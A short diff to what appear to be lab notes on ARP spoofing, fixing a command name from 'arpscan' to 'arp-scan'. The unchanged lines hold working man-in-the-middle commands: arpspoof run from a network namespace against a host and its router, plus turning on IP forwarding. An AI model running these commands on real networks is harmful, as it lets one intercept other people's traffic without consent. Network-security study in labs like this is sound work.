@@ -1,7 +1,7 @@
 # saying to other that i am the router, so they will send the packet to me
 # it replaces the MAC of the router with mine 
 # the attacker needs to be connected to the same switch of the victim
-arpscan 10.0.0.0/24
+arp-scan 10.0.0.0/24
 sudo ip netns exec H1 arpspoof -i veth0 -t 10.0.0.1 -r 10.0.0.254
 sudo ip netns exec H1 sysctl -w net.ipv4.ip_forward=1
 
